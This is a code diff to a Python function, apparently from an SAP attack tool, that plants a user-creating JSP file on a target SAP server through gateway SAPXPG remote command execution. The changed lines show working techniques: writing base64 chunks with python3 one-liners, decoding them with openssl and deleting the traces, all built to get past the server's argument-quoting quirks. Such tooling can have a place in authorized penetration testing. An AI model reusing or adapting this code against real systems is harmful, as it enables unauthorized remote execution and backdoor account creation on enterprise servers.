@@ -417,28 +417,34 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
     suffix = "".join(_r.choice(_s.ascii_lowercase) for _ in range(6))
 
     if linux:
-        # On Linux some SAPXPG kernels do a raw whitespace split on
-        # PARAMS (dropping both " and \" as literal chars), which
-        # breaks any `/bin/sh -c "..."` script with embedded spaces.
-        # For the decode step we sidestep the shell entirely by using
-        # /usr/bin/openssl, which accepts -in and -out as separate
-        # argv tokens.  For the echo chunks we still need a shell,
-        # but we wrap the script in SINGLE quotes — single quotes
-        # survive every sapxpg tokenizer we've seen in the wild, and
-        # base64 content is pure [A-Za-z0-9+/=] so it can't contain one.
-        chunk_shell = "/bin/sh"
+        # SAPXPG PARAMS on some kernels (e.g. SJ1) does a raw
+        # whitespace split AND keeps quote chars as literals, so
+        # `/bin/sh -c "..."` and `/bin/sh -c '...'` both fail with
+        # unbalanced quotes.  Avoid shell entirely and use programs
+        # whose argv is naturally space-tokenised:
+        #
+        #   chunks  -> python3 -c open('/tmp/…','ab').write(b'CHUNK')
+        #     Python script is a single token (no spaces).  Base64
+        #     chunks are [A-Za-z0-9+/=] so they never break the
+        #     b'...' literal.
+        #   decode  -> /usr/bin/openssl enc -d -base64 -in I -out O
+        #   cleanup -> /bin/rm -f FILE
+        chunk_shell = "python3"
         decode_shell = "/usr/bin/openssl"
+        cleanup_shell = "/bin/rm"
         tmp_b64 = f"/tmp/sapmap_ume_{suffix}.b64"
-        chunk_size = 800  # POSIX shells have much more cmdline room
+        chunk_size = 800
 
         def echo_args(chunk, op):
-            return f"-c 'echo {chunk} {op} {tmp_b64}'"
+            mode = "wb" if op == ">" else "ab"
+            return f"-c open('{tmp_b64}','{mode}').write(b'{chunk}')"
 
         decode_args = f"enc -d -base64 -in {tmp_b64} -out {target_path}"
-        cleanup_args = f"-c 'rm -f {tmp_b64}'"
+        cleanup_args = f"-f {tmp_b64}"
     else:
         chunk_shell = "cmd.exe"
         decode_shell = "cmd.exe"
+        cleanup_shell = "cmd.exe"
         tmp_b64 = r"%TEMP%\sapmap_ume.b64"
 
         def echo_args(chunk, op):
@@ -454,7 +460,7 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
 
     # 0) Clean up any prior leftover
     try:
-        exec_fn(chunk_shell, cleanup_args)
+        exec_fn(cleanup_shell, cleanup_args)
     except Exception:
         pass
 
@@ -488,7 +494,7 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
 
     # 3) Clean up the tmp base64 file
     try:
-        exec_fn(chunk_shell, cleanup_args)
+        exec_fn(cleanup_shell, cleanup_args)
     except Exception:
         pass
 
